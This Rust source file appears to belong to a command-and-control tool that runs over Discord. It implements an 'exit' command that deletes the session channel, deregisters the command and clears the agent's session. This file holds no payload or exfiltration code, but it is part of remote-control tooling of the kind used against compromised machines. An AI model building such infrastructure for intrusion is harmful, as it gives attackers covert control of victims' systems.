use crate::commands::sessions::get_command_id_by_name;
use crate::errors::DiscordC2Error;
use crate::utils::agent::get_or_create_agent;
use serenity::builder::CreateApplicationCommand;
use serenity::client::Context;
use serenity::model::application::command::Command;
use serenity::model::id::CommandId;

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("exit")
        .description("Exit the current interactive command session.")
}

pub async fn run(ctx: &Context) -> Result<String, DiscordC2Error> {
    let mut agent = get_or_create_agent(ctx).await;
    let session_channel = agent.get_session_channel();
    match session_channel {
        Some(channel) => {
            channel.delete(&ctx.http).await?;
            let command_id = match get_command_id_by_name(&ctx, "exit").await {
                Some(id) => id,
                None => return Err(DiscordC2Error::CommandNotFound("exit".to_string())),
            };
            Command::delete_global_application_command(&ctx.http, CommandId::from(command_id)).await?;
            agent
                .set_session_channel(None)
                .map_err(|e| DiscordC2Error::AgentError(e.to_string()))?; //Nullify the session channel
        }
        None => return Err(DiscordC2Error::NoSessionChannel),
    }

    //TODO: add session cleanup logic here
    Ok("".parse().unwrap())
}
